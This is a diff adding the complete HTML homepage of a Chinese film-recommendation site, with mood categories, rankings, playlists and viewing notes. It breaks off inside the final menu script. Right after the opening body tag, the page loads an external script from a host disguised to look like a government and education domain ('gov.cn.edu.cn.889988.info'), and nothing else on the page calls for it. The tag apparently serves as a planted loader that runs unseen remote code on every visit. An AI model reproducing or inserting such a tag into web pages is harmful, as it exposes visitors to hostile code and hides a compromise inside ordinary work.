@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="泡泡电影网，轻松好看的电影片单与观影指南。用轻盈的视角聊电影：治愈、爆笑、爽片、冷门佳作，帮你 3 分钟决定今晚看什么。">
+<meta name="keywords" content="泡泡电影网,轻松电影推荐,治愈电影,搞笑电影,爽片片单,冷门佳作,观影指南,周末片单">
+<meta name="author" content="泡泡电影网">
+<meta name="theme-color" content="#0ea5e9">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<title>泡泡电影网 - 轻松好看的电影，3 分钟挑到爽</title>
+<link rel="canonical" href="https://paopaodianyingwang-cn.github.io/">
+<style>
+:root{
+  --sky:#0ea5e9; --blue:#2563eb; --cyan:#22d3ee; --bubble:#e0f7fe;
+  --ink:#0f2a43; --muted:#6b8aa3; --paper:#f5fbff; --card:#fff;
+  --line:#d9edf9; --pink:#ff7eb9; --yellow:#ffd23f; --green:#70e3a1; --purple:#a78bfa;
+  --r:22px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",ui-sans-serif,system-ui,sans-serif;
+  background:var(--paper);color:var(--ink);line-height:1.72;font-size:15.5px;
+}
+a{color:inherit;text-decoration:none;outline:none}
+a:focus-visible,button:focus-visible,input:focus-visible{outline:2px solid var(--sky);outline-offset:2px}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+::selection{background:var(--sky);color:#fff}
+/* ===== 顶栏 ===== */
+header{background:rgba(255,255,255,.82);backdrop-filter:blur(14px);position:sticky;top:0;z-index:60;border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:16px;height:68px}
+.logo{display:flex;align-items:center;gap:9px;font-weight:900;font-size:21px;letter-spacing:1px;color:var(--ink)}
+.logo .bub{width:30px;height:30px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#fff 0 9%,#7dd7f7 10% 42%,#2ba9e6 43%);box-shadow:0 5px 12px rgba(14,165,233,.35);animation:floaty 4.2s ease-in-out infinite}
+@keyframes floaty{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
+.logo em{font-style:normal;font-size:10px;letter-spacing:3px;color:var(--sky);font-weight:800;align-self:flex-end;margin-bottom:4px}
+nav.primary{display:flex;gap:4px;margin-left:14px}
+nav.primary a{font-size:13.5px;font-weight:700;padding:8px 13px;color:#3a5d78;border-radius:10px}
+nav.primary a:hover{background:var(--bubble);color:var(--blue)}
+.search{margin-left:auto;display:flex;align-items:center;gap:6px;background:#fff;border:1px solid var(--line);border-radius:24px;padding:5px 6px 5px 14px}
+.search input{border:0;background:none;font:inherit;font-size:13px;width:140px;outline:none;color:var(--ink)}
+.search input::placeholder{color:#9fbdd1}
+.search button{border:0;background:var(--sky);color:#fff;font:inherit;font-size:12px;font-weight:800;padding:8px 15px;border-radius:20px;cursor:pointer;letter-spacing:1px}
+.ham{display:none;background:none;border:0;color:var(--ink);font-size:26px;cursor:pointer;margin-left:auto}
+/* ===== Hero ===== */
+.hero{position:relative;padding:44px 0 20px;overflow:hidden}
+.hero::before{content:"";position:absolute;width:520px;height:520px;border-radius:50%;background:radial-gradient(circle,rgba(125,215,247,.55),transparent 68%);top:-180px;right:-120px;z-index:0}
+.hero::after{content:"";position:absolute;width:360px;height:360px;border-radius:50%;background:radial-gradient(circle,rgba(167,139,250,.30),transparent 68%);bottom:-160px;left:-90px;z-index:0}
+.hero-in{position:relative;z-index:1;display:grid;grid-template-columns:1.05fr .95fr;gap:40px;align-items:center}
+h1{font-size:clamp(32px,5.4vw,58px);line-height:1.2;font-weight:900;letter-spacing:-.5px}
+h1 .pop{display:inline-block;position:relative}
+h1 .pop::after{content:"";position:absolute;left:6%;right:6%;bottom:6px;height:14px;border-radius:8px;background:rgba(255,210,63,.55);z-index:-1}
+h1 small{display:block;font-size:15px;font-weight:600;color:var(--muted);margin-top:16px;letter-spacing:1px}
+.lede{color:#4a6b82;margin:16px 0 22px;max-width:540px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.chips span{font-size:12px;font-weight:700;padding:6px 13px;border-radius:20px;background:#fff;border:1px solid var(--line);color:#3a5d78}
+.chips span:nth-child(1){background:#e0f7fe;color:#0369a1;border-color:#bae6fd}
+.hero-acts{display:flex;gap:11px;flex-wrap:wrap}
+.btn{border:0;cursor:pointer;font:inherit;font-weight:800;font-size:14px;padding:13px 26px;border-radius:30px;transition:.22s;display:inline-flex;align-items:center;gap:7px;letter-spacing:.4px}
+.btn-main{background:var(--ink);color:#fff;box-shadow:0 14px 28px rgba(15,42,67,.24)}
+.btn-main:hover{background:var(--blue);transform:translateY(-2px)}
+.btn-soft{background:#fff;color:var(--ink);border:1px solid var(--line)}
+/* 今日泡泡 */
+.blob{background:#fff;border:1px solid var(--line);border-radius:38px 38px 12px 38px;padding:24px;position:relative;box-shadow:0 20px 44px rgba(14,165,233,.14)}
+.blob .floating{position:absolute;border-radius:50%;opacity:.85}
+.blob .b1{width:64px;height:64px;background:#ffd23f;right:22px;top:-22px;animation:floaty 3.6s ease-in-out infinite}
+.blob .b2{width:34px;height:34px;background:#ff7eb9;right:100px;top:8px;animation:floaty 2.9s ease-in-out infinite .5s}
+.blob .b3{width:22px;height:22px;background:#70e3a1;right:46px;bottom:26px;animation:floaty 3.2s ease-in-out infinite .9s}
+.blob h3{font-size:12px;letter-spacing:3px;color:var(--sky);font-weight:800}
+.blob .pick{font-size:24px;font-weight:900;margin:8px 0 6px;line-height:1.4}
+.blob p{color:#5b7b93;font-size:13.5px}
+.blob .go{margin-top:14px;font-size:12.5px;font-weight:800;color:var(--blue)}
+/* ===== section 通用 ===== */
+section{padding:54px 0}
+.st{display:flex;align-items:baseline;justify-content:space-between;gap:14px;flex-wrap:wrap;margin-bottom:24px}
+.st h2{font-size:clamp(22px,3.3vw,30px);font-weight:900;display:flex;align-items:center;gap:10px}
+.st h2 i{font-style:normal;font-size:11px;font-weight:800;color:#fff;background:var(--sky);padding:5px 10px;border-radius:20px;letter-spacing:1px}
+.st a.more{font-size:12.5px;font-weight:700;color:var(--muted)}
+.st a.more:hover{color:var(--blue)}
+/* ===== A 电影：胶片格 ===== */
+.film{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.f{background:#fff;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.25s;cursor:pointer}
+.f:hover{transform:translateY(-6px);box-shadow:0 22px 40px rgba(14,165,233,.18);border-color:#bae6fd}
+.f .cv{height:180px;position:relative;background:linear-gradient(150deg,var(--a,#0ea5e9),var(--b,#2563eb))}
+.f .cv::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 50% 40%,rgba(255,255,255,.35),transparent 55%)}
+.f .cv b{position:absolute;left:12px;bottom:10px;color:#fff;font-size:20px;font-weight:900;letter-spacing:1px;text-shadow:0 2px 6px rgba(0,0,0,.25)}
+.f .cv .mk{position:absolute;right:10px;top:10px;font-size:10px;font-weight:800;color:#0369a1;background:rgba(255,255,255,.92);padding:3px 8px;border-radius:14px}
+.f .bd{padding:15px 17px}
+.f h4{font-size:16px;line-height:1.45}
+.f .meta{font-size:11.5px;color:var(--muted);margin:5px 0 10px;display:flex;gap:6px;flex-wrap:wrap}
+.f .meta s{text-decoration:none;padding:1px 7px;border-radius:5px;background:#f0f9ff;color:#0284c7}
+.f .bar{height:6px;border-radius:6px;background:#eaf6fd;overflow:hidden}
+.f .bar i{display:block;height:100%;border-radius:6px;background:linear-gradient(90deg,var(--cyan),var(--blue));font-style:normal}
+.f .sc{margin-top:8px;font-size:11px;color:var(--muted);display:flex;justify-content:space-between}
+.f .sc b{color:var(--blue);font-variant-numeric:tabular-nums}
+/* ===== B 心情：圆形气泡 ===== */
+.mood{display:grid;grid-template-columns:repeat(6,1fr);gap:14px}
+.m{text-align:center;cursor:pointer}
+.m .o{width:100%;aspect-ratio:1/1;border-radius:50%;margin:0 auto;display:grid;place-items:center;font-size:clamp(13px,1.6vw,16px);font-weight:900;color:#fff;transition:.25s;box-shadow:0 12px 24px rgba(14,165,233,.22)}
+.m:hover .o{transform:scale(1.09) translateY(-4px)}
+.m h5{font-size:13px;margin-top:9px}
+.m small{font-size:10.5px;color:var(--muted)}
+/* ===== C 榜单：气泡竞赛 ===== */
+.rank{display:grid;grid-template-columns:1.05fr 1fr;gap:20px}
+.foam{background:#fff;border:1px solid var(--line);border-radius:26px;padding:22px 24px;display:flex;flex-direction:column;gap:13px}
+.row2{display:grid;grid-template-columns:52px 1fr 104px;gap:13px;align-items:center}
+.row2 .no{height:42px;border-radius:50%;display:grid;place-items:center;font-weight:900;font-size:18px;color:#fff;background:linear-gradient(150deg,var(--a,#22d3ee),var(--b,#2563eb))}
+.row2 .tx h4{font-size:15.5px;line-height:1.4}
+.row2 .tx small{font-size:11px;color:var(--muted)}
+.bubble-bar{height:14px;border-radius:14px;background:#eaf6fd;position:relative;overflow:hidden}
+.bubble-bar span{position:absolute;left:0;top:0;bottom:0;border-radius:14px;background:linear-gradient(90deg,#7dd7f7,#2563eb);box-shadow:0 0 0 3px #fff inset}
+.bubble-bar b{position:absolute;right:8px;top:-1px;font-size:11px;font-weight:800;color:#075985;font-variant-numeric:tabular-nums}
+.rank-side{display:flex;flex-direction:column;gap:14px}
+.rs{background:#fff;border:1px solid var(--line);border-radius:20px;padding:18px 20px;cursor:pointer;transition:.22s}
+.rs:hover{border-color:#7dd7f7;background:#f0f9ff;transform:translateX(4px)}
+.rs h4{font-size:15px}
+.rs p{font-size:12px;color:var(--muted);margin-top:4px}
+/* ===== D 片单：手风琴 ===== */
+.acc{border:1px solid var(--line);border-radius:24px;overflow:hidden;background:#fff}
+.item{border-bottom:1px solid var(--line)}
+.item:last-child{border:0}
+.item input{position:absolute;opacity:0;width:0;height:0}
+.item label{cursor:pointer;display:grid;grid-template-columns:78px 1fr 40px;gap:16px;align-items:center;padding:16px 20px;font-weight:800;font-size:16px}
+.item label .thumb{height:52px;border-radius:12px;background:linear-gradient(140deg,var(--a,#0ea5e9),var(--b,#a78bfa))}
+.item label .arw{width:30px;height:30px;border-radius:50%;background:#eaf6fd;display:grid;place-items:center;font-size:14px;color:var(--blue);transition:.25s;justify-self:end}
+.item input:checked + label .arw{transform:rotate(180deg);background:var(--sky);color:#fff}
+.item .body{max-height:0;overflow:hidden;transition:max-height .35s ease}
+.item input:checked ~ .body{max-height:320px}
+.item .body .in{padding:0 20px 18px 114px;color:#4a6b82;font-size:13.5px}
+.item .body .tags{margin-top:9px;display:flex;gap:6px;flex-wrap:wrap}
+.item .body .tags s{text-decoration:none;font-size:11px;font-weight:700;padding:3px 10px;border-radius:14px;background:#e0f7fe;color:#0369a1}
+/* ===== E 笔记：卡片 + 悬浮要点 ===== */
+.notes{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.n{background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:22px;position:relative;transition:.24s;cursor:pointer}
+.n:hover{box-shadow:0 20px 40px rgba(14,165,233,.16);transform:translateY(-5px)}
+.n .ic{width:44px;height:44px;border-radius:14px;background:linear-gradient(140deg,var(--a,#22d3ee),var(--b,#2563eb));margin-bottom:12px}
+.n h4{font-size:16.5px;line-height:1.5}
+.n p{font-size:13px;color:#5b7b93;margin-top:7px}
+.n .dot{position:absolute;right:20px;bottom:18px;width:12px;height:12px;border-radius:50%;background:var(--yellow)}
+/* ===== F 指南：步骤条 ===== */
+.guide{display:grid;grid-template-columns:repeat(4,1fr);gap:0;position:relative}
+.guide::before{content:"";position:absolute;left:8%;right:8%;top:34px;height:3px;background:linear-gradient(90deg,var(--cyan),var(--pink));border-radius:3px;z-index:0}
+.step{position:relative;z-index:1;text-align:center;padding:0 14px}
+.step .cir{width:64px;height:64px;margin:0 auto 14px;border-radius:50%;background:#fff;border:3px solid #fff;box-shadow:0 0 0 3px var(--sky);display:grid;place-items:center;font-size:19px;font-weight:900;color:var(--blue);transition:.25s}
+.step:hover .cir{background:var(--sky);color:#fff;transform:scale(1.1)}
+.step h4{font-size:15.5px}
+.step p{font-size:12px;color:var(--muted);margin-top:5px}
+/* ===== Footer ===== */
+footer{background:var(--ink);color:#b9d4e6;padding:48px 0 22px;margin-top:14px}
+.foot{display:grid;grid-template-columns:1.8fr 1fr 1fr 1fr;gap:30px;margin-bottom:24px}
+.foot .brand{color:#fff;font-size:20px;font-weight:900;letter-spacing:2px;display:flex;align-items:center;gap:9px}
+.foot .brand .bub{width:26px;height:26px;border-radius:50%;background:radial-gradient(circle at 32% 30%,#fff 0 9%,#7dd7f7 10% 42%,#2ba9e6 43%)}
+.foot .brand em{font-style:normal;color:var(--cyan);font-size:10px;letter-spacing:3px;font-weight:700;align-self:flex-end;margin-bottom:3px}
+.foot p.about{font-size:12.5px;color:#8fadbf;margin-top:12px;max-width:320px}
+.foot h5{color:#fff;font-size:12.5px;letter-spacing:2px;margin-bottom:11px}
+.foot a{display:block;color:#8fadbf;font-size:12.5px;padding:4px 0}
+.foot a:hover{color:var(--cyan)}
+.copy{text-align:center;color:#6f91a8;font-size:11.5px;border-top:1px solid rgba(255,255,255,.1);padding-top:20px}
+.copy a{color:var(--cyan)}
+@media(max-width:980px){
+  nav.primary,.search{display:none}
+  .ham{display:block}
+  .drawer{position:fixed;inset:68px 0 0 0;background:var(--paper);padding:20px;transform:translateX(102%);transition:.32s;z-index:55;display:flex;flex-direction:column;gap:2px;overflow:auto;border-top:1px solid var(--line)}
+  .drawer.open{transform:none}
+  .drawer a{color:var(--ink);font-size:17px;font-weight:700;padding:15px 18px;border-radius:12px}
+  .drawer a:hover{background:var(--bubble)}
+  .hero-in{grid-template-columns:1fr}
+  .film,.notes{grid-template-columns:1fr 1fr}
+  .mood{grid-template-columns:repeat(3,1fr)}
+  .rank{grid-template-columns:1fr}
+  .guide{grid-template-columns:1fr 1fr}
+}
+@media(max-width:560px){
+  .film,.notes,.mood,.guide{grid-template-columns:1fr}
+  .guide::before{display:none}
+  section{padding:42px 0}
+  .item label{grid-template-columns:56px 1fr 30px;gap:11px;font-size:15px}
+  .item .body .in{padding-left:20px}
+  .blob .pick{font-size:20px}
+}
+@media print{body{background:#fff;color:#000}.nav,.btn,.search,.blob .floating{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#top" aria-label="泡泡电影网 首页">
+      <span class="bub" aria-hidden="true"></span>泡泡电影网<em>PAOPAO</em>
+    </a>
+    <nav class="primary" aria-label="主导航">
+      <a href="#film">电影</a>
+      <a href="#mood">心情</a>
+      <a href="#rank">榜单</a>
+      <a href="#list">片单</a>
+      <a href="#notes">笔记</a>
+      <a href="#guide">指南</a>
+    </nav>
+    <div class="search" role="search">
+      <input type="search" placeholder="片名 / 心情 / 时长" aria-label="搜索">
+      <button>找片</button>
+    </div>
+    <button class="ham" id="ham" aria-label="菜单" aria-expanded="false">☰</button>
+  </div>
+  <div class="drawer" id="drawer" aria-label="移动端导航">
+    <a href="#film">轻松电影</a>
+    <a href="#mood">今日心情</a>
+    <a href="#rank">泡泡榜单</a>
+    <a href="#list">精选片单</a>
+    <a href="#notes">观影笔记</a>
+    <a href="#guide">挑片指南</a>
+    <a href="#about">关于本站</a>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="wrap hero-in">
+      <div>
+        <span class="chips"><span>🫧 轻松向</span><span>治愈</span><span>爆笑</span><span>爽片</span><span>冷门</span></span>
+        <h1>今晚看什么？<br><span class="pop">让泡泡</span>替你挑。</h1>
+        <small>BUBBLE PICKS · 3 MINUTE TO CHOOSE</small>
+        <p class="lede">泡泡电影网不做晦涩的影评，只做一件小事：在你打开电视的前三分钟，帮你决定今晚看哪一部。按心情分类、按时长推荐、按"爽度"打分——轻松、不装、不踩雷。</p>
+        <div class="hero-acts">
+          <a class="btn btn-main" href="#mood">按心情找片 →</a>
+          <a class="btn btn-soft" href="#rank">看今日榜单</a>
+        </div>
+      </div>
+      <aside class="blob" aria-label="今日推荐">
+        <span class="floating b1" aria-hidden="true"></span>
+        <span class="floating b2" aria-hidden="true"></span>
+        <span class="floating b3" aria-hidden="true"></span>
+        <h3>🫧 TODAY'S BUBBLE</h3>
+        <div class="pick">《海边的曼彻斯特》<br>不治愈，但很真实</div>
+        <p>累了就别看"治愈片"。今晚适合一部允许你难过的电影——它不会拉你起来，但会坐在你旁边。</p>
+        <a class="go" href="#">查看为什么推荐它 →</a>
+      </aside>
+    </div>
+  </section>
+
+  <!-- 栏目 1：电影（胶片格） -->
+  <section id="film" class="wrap" itemscope itemtype="https://schema.org/ItemList">
+    <div class="st">
+      <h2>轻松电影 <i>BUBBLE PICKS</i></h2>
+      <a class="more" href="#">全部电影 ›</a>
+    </div>
+    <div class="film">
+      <a class="f" href="#" itemprop="itemListElement" itemscope itemtype="https://schema.org/Movie">
+        <div class="cv" style="--a:#fde68a;--b:#f97316"><b>夏日</b><span class="mk">治愈</span></div>
+        <div class="bd">
+          <h4 itemprop="name">夏日循环</h4>
+          <div class="meta"><s>治愈</s><s>青春</s><s>96 分钟</s></div>
+          <div class="bar"><i style="width:92%"></i></div>
+          <div class="sc"><span>轻松指数</span><b>9.2</b></div>
+        </div>
+      </a>
+      <a class="f" href="#">
+        <div class="cv" style="--a:#fbcfe8;--b:#ec4899"><b>爆笑</b><span class="mk">爽片</span></div>
+        <div class="bd"><h4>深夜便利店</h4><div class="meta"><s>喜剧</s><s>群像</s><s>88 分钟</s></div><div class="bar"><i style="width:88%"></i></div><div class="sc"><span>爆笑指数</span><b>8.8</b></div></div>
+      </a>
+      <a class="f" href="#">
+        <div class="cv" style="--a:#c4b5fd;--b:#7c3aed"><b>悬疑</b><span class="mk">反转</span></div>
+        <div class="bd"><h4>第 13 级台阶</h4><div class="meta"><s>悬疑</s><s>密室</s><s>104 分钟</s></div><div class="bar"><i style="width:84%"></i></div><div class="sc"><span>爽度指数</span><b>8.6</b></div></div>
+      </a>
+      <a class="f" href="#">
+        <div class="cv" style="--a:#a7f3d0;--b:#059669"><b>冷门</b><span class="mk">佳作</span></div>
+        <div class="bd"><h4>邮差与海</h4><div class="meta"><s>冷门</s><s>公路</s><s>112 分钟</s></div><div class="bar"><i style="width:78%"></i></div><div class="sc"><span>惊喜指数</span><b>8.3</b></div></div>
+      </a>
+      <a class="f" href="#">
+        <div class="cv" style="--a:#bae6fd;--b:#0ea5e9"><b>动画</b><span class="mk">合家欢</span></div>
+        <div class="bd"><h4>云朵上的猫</h4><div class="meta"><s>动画</s><s>奇幻</s><s>78 分钟</s></div><div class="bar"><i style="width:90%"></i></div><div class="sc"><span>治愈指数</span><b>9.0</b></div></div>
+      </a>
+      <a class="f" href="#">
+        <div class="cv" style="--a:#fed7aa;--b:#ea580c"><b>冒险</b><span class="mk">解压</span></div>
+        <div class="bd"><h4>屋顶赛车手</h4><div class="meta"><s>动作</s><s>冒险</s><s>120 分钟</s></div><div class="bar"><i style="width:81%"></i></div><div class="sc"><span>解压指数</span><b>8.5</b></div></div>
+      </a>
+      <a class="f" href="#">
+        <div class="cv" style="--a:#fecaca;--b:#dc2626"><b>爱情</b><span class="mk">甜</span></div>
+        <div class="bd"><h4>雨天咖啡馆</h4><div class="meta"><s>爱情</s><s>慢节奏</s><s>99 分钟</s></div><div class="bar"><i style="width:86%"></i></div><div class="sc"><span>心动指数</span><b>8.7</b></div></div>
+      </a>
+      <a class="f" href="#">
+        <div class="cv" style="--a:#e5e7eb;--b:#475569"><b>纪录片</b><span class="mk">长见识</span></div>
+        <div class="bd"><h4>一粒盐的旅行</h4><div class="meta"><s>纪录片</s><s>52 分钟</s></div><div class="bar"><i style="width:74%"></i></div><div class="sc"><span>涨知识</span><b>8.1</b></div></div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 栏目 2：心情（圆形气泡） -->
+  <section id="mood" class="wrap">
+    <div class="st">
+      <h2>今日心情 <i>MOOD</i></h2>
+      <a class="more" href="#">心情算法 ›</a>
+    </div>
+    <div class="mood">
+      <div class="m"><div class="o" style="background:linear-gradient(150deg,#7dd7f7,#2563eb)">😌</div><h5>累了</h5><small>治愈系</small></div>
+      <div class="m"><div class="o" style="background:linear-gradient(150deg,#fbcfe8,#ec4899)">😂</div><h5>想笑</h5><small>爆笑片</small></div>
+      <div class="m"><div class="o" style="background:linear-gradient(150deg,#fde68a,#f97316)">🔥</div><h5>想爽</h5><small>爽片</small></div>
+      <div class="m"><div class="o" style="background:linear-gradient(150deg,#c4b5fd,#7c3aed)">🤯</div><h5>烧脑</h5><small>反转</small></div>
+      <div class="m"><div class="o" style="background:linear-gradient(150deg,#a7f3d0,#059669)">🍃</div><h5>平静</h5><small>慢电影</small></div>
+      <div class="m"><div class="o" style="background:linear-gradient(150deg,#fecaca,#dc2626)">💔</div><h5>想哭</h5><small>催泪</small></div>
+    </div>
+  </section>
+
+  <!-- 栏目 3：榜单（气泡竞赛） -->
+  <section id="rank" class="wrap">
+    <div class="st">
+      <h2>泡泡榜单 <i>TOP 5</i></h2>
+      <a class="more" href="#">完整榜单 ›</a>
+    </div>
+    <div class="rank" itemscope itemtype="https://schema.org/ItemList">
+      <div class="foam">
+        <div class="row2" itemprop="itemListElement"><span class="no" style="--a:#fde68a;--b:#f59e0b">1</span><div class="tx"><h4>夏日循环</h4><small>治愈 · 青春 · 96 分钟</small></div><div class="bubble-bar"><span style="width:96%"></span><b>9.6</b></div></div>
+        <div class="row2" itemprop="itemListElement"><span class="no" style="--a:#e5e7eb;--b:#94a3b8">2</span><div class="tx"><h4>云朵上的猫</h4><small>动画 · 奇幻 · 78 分钟</small></div><div class="bubble-bar"><span style="width:91%"></span><b>9.1</b></div></div>
+        <div class="row2" itemprop="itemListElement"><span class="no" style="--a:#fed7aa;--b:#d97706">3</span><div class="tx"><h4>深夜便利店</h4><small>喜剧 · 群像 · 88 分钟</small></div><div class="bubble-bar"><span style="width:87%"></span><b>8.8</b></div></div>
+        <div class="row2"><span class="no" style="--a:#bae6fd;--b:#0ea5e9">4</span><div class="tx"><h4>第 13 级台阶</h4><small>悬疑 · 密室 · 104 分钟</small></div><div class="bubble-bar"><span style="width:83%"></span><b>8.5</b></div></div>
+        <div class="row2"><span class="no" style="--a:#ddd6fe;--b:#8b5cf6">5</span><div class="tx"><h4>雨天咖啡馆</h4><small>爱情 · 慢节奏 · 99 分钟</small></div><div class="bubble-bar"><span style="width:80%"></span><b>8.3</b></div></div>
+      </div>
+      <div class="rank-side">
+        <a class="rs" href="#"><h4>🫧 本周上升最快</h4><p>《一粒盐的旅行》——52 分钟，看完想给妈妈打电话。</p></a>
+        <a class="rs" href="#"><h4>🎈 周末合家欢</h4><p>《云朵上的猫》——孩子笑，大人哭，都不尴尬。</p></a>
+        <a class="rs" href="#"><h4>🌙 深夜独处</h4><p>《邮差与海》——不说话也好看的那种电影。</p></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目 4：片单（手风琴） -->
+  <section id="list" class="wrap">
+    <div class="st">
+      <h2>精选片单 <i>PLAYLIST</i></h2>
+      <a class="more" href="#">全部片单 ›</a>
+    </div>
+    <div class="acc">
+      <div class="item"><input type="checkbox" id="a1" checked><label for="a1"><span class="thumb" style="--a:#fde68a;--b:#f97316"></span><span>下雨天必看的 6 部电影</span><span class="arw">▾</span></label><div class="body"><div class="in">雨天不需要剧情太硬。要的是窗外的雨、屋里的灯、杯里的热饮，和一部允许你发呆的电影。<div class="tags"><s>治愈</s><s>慢节奏</s><s>雨天</s><s>约 90 分钟</s></div></div></div></div>
+      <div class="item"><input type="checkbox" id="a2"><label for="a2"><span class="thumb" style="--a:#fbcfe8;--b:#ec4899"></span><span>加班到十点，看这部就够</span><span class="arw">▾</span></label><div class="body"><div class="in">只推荐 80 分钟以内的"回血片"：笑点密、节奏快、看完不累。<div class="tags"><s>解压</s><s>短时长</s><s>喜剧</s></div></div></div></div>
+      <div class="item"><input type="checkbox" id="a3"><label for="a3"><span class="thumb" style="--a:#c4b5fd;--b:#7c3aed"></span><span>别再只看那几部了（冷门 7 选）</span><span class="arw">▾</span></label><div class="body"><div class="in">豆瓣 8 分以上、评分人数不足 5 万的好片。送给已经"片荒"的你。<div class="tags"><s>冷门</s><s>高分</s><s>长尾</s></div></div></div></div>
+      <div class="item"><input type="checkbox" id="a4"><label for="a4"><span class="thumb" style="--a:#a7f3d0;--b:#059669"></span><span>带爸妈看，不会尴尬的 5 部</span><span class="arw">▾</span></label><div class="in">没有床戏、没有脏话、没有看不懂的隐喻。全家坐着看完，还能一起聊两句。<div class="tags"><s>合家欢</s><s>亲情</s><s>国产</s></div></div></div>
+      <div class="item"><input type="checkbox" id="a5"><label for="a5"><span class="thumb" style="--a:#bae6fd;--b:#0284c7"></span><span>看完想立刻出发旅行的 4 部</span><span class="arw">▾</span></label><div class="body"><div class="in">取景地本身就是主角：海边、小巷、旧车站、未命名的岛屿。<div class="tags"><s>旅行</s><s>风景</s><s>治愈</s></div></div></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目 5：笔记（卡片） -->
+  <section id="notes" class="wrap">
+    <div class="st">
+      <h2>观影笔记 <i>NOTES</i></h2>
+      <a class="more" href="#">全部笔记 ›</a>
+    </div>
+    <div class="notes">
+      <a class="n" href="#"><div class="ic" style="--a:#fde68a;--b:#f97316"></div><h4>为什么"治愈片"反而让人哭？</h4><p>因为它先让你放松，再轻轻戳一下。防御卸掉的那一刻，眼泪才流得出来。</p><span class="dot" aria-hidden="true"></span></a>
+      <a class="n" href="#"><div class="ic" style="--a:#7dd7f7;--b:#2563eb"></div><h4>90 分钟，是疲惫成年人的上限</h4><p>不是没时间，是注意力余额不足。短片单的挑选逻辑，其实是精力管理。</p><span class="dot" aria-hidden="true" style="background:var(--pink)"></span></a>
+      <a class="n" href="#"><div class="ic" style="--a:#a7f3d0;--b:#059669"></div><h4>别用倍速看慢电影</h4><p>慢电影的时间感就是它的意义。快进的那几秒，恰恰是最贵的部分。</p><span class="dot" aria-hidden="true" style="background:var(--purple)"></span></a>
+    </div>
+  </section>
+
+  <!-- 栏目 6：指南（步骤条） -->
+  <section id="guide" class="wrap">
+    <div class="st">
+      <h2>挑片指南 <i>HOW TO PICK</i></h2>
+      <a class="more" href="#">完整指南 ›</a>
+    </div>
+    <div class="guide">
+      <div class="step"><div class="cir">01</div><h4>问心情</h4><p>累、想笑、想爽、想哭？先承认自己今天要什么。</p></div>
+      <div class="step"><div class="cir">02</div><h4>定时长</h4><p>剩 1 小时看短片，剩一整个下午才敢开史诗。</p></div>
+      <div class="step"><div class="cir">03</div><h4>看评分</h4><p>分数不是真理，但"分数高且人数少"通常是宝藏。</p></div>
+      <div class="step"><div class="cir">04</div><h4>关弹幕</h4><p>第一次看，别让任何人的评价先进你的脑子。</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目 7：关于 -->
+  <section id="about" class="wrap">
+    <div class="st">
+      <h2>关于泡泡电影网 <i>ABOUT</i></h2>
+      <a class="more" href="#">投稿 ›</a>
+    </div>
+    <div class="notes">
+      <div class="n"><div class="ic" style="--a:#7dd7f7;--b:#0ea5e9"></div><h4>轻</h4><p>不讲理论，不堆术语。一句话说清"这部片适合谁、什么时候看"。</p><span class="dot" style="background:var(--cyan)" aria-hidden="true"></span></div>
+      <div class="n"><div class="ic" style="--a:#fbcfe8;--b:#ec4899"></div><h4>准</h4><p>按心情和时长分类，而不是按国家、年代、导演。找片更快。</p><span class="dot" style="background:var(--pink)" aria-hidden="true"></span></div>
+      <div class="n"><div class="ic" style="--a:#fde68a;--b:#fbbf24"></div><h4>正</h4><p>本站仅为影视赏析与导航，请通过合法授权平台观看，支持创作者。</p><span class="dot" style="background:var(--yellow)" aria-hidden="true"></span></div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="brand"><span class="bub" aria-hidden="true"></span>泡泡电影网<em>PAOPAO CINEMA</em></div>
+        <p class="about">泡泡电影网是一个"帮你决定今晚看什么"的轻量影视推荐站。按心情、按时长、按爽度——3 分钟，挑到爽。</p>
+      </div>
+      <div>
+        <h5>频道</h5>
+        <a href="#film">轻松电影</a>
+        <a href="#mood">今日心情</a>
+        <a href="#rank">泡泡榜单</a>
+        <a href="#list">精选片单</a>
+        <a href="#notes">观影笔记</a>
+      </div>
+      <div>
+        <h5>心情索引</h5>
+        <a href="#">累了 · 治愈</a>
+        <a href="#">想笑 · 喜剧</a>
+        <a href="#">想爽 · 解压</a>
+        <a href="#">烧脑 · 反转</a>
+        <a href="#">想哭 · 催泪</a>
+      </div>
+      <div>
+        <h5>关于</h5>
+        <a href="#about">关于本站</a>
+        <a href="#guide">挑片指南</a>
+        <a href="#">投稿片单</a>
+        <a href="#">版权声明</a>
+        <a href="#">意见反馈</a>
+      </div>
+    </div>
+    <div class="copy">
+      © <span id="yr">2026</span> 泡泡电影网 &nbsp;|&nbsp; 网站网址：<a href="https://paopaodianyingwang-cn.github.io">https://paopaodianyingwang-cn.github.io</a> &nbsp;|&nbsp; 本站为影视赏析与信息导航，倡导支持正版影视与创作者
+    </div>
+  </div>
+</footer>
+
+<script>
+var ham=document.getElementById('ham'),dr=document.getElementById('drawer');
+ham.addEventListener('click',function(){
+  dr.classList.toggle('open');
+  var o=dr.classList.contains('open');
+  ham.setAttribute('aria-expanded',o);
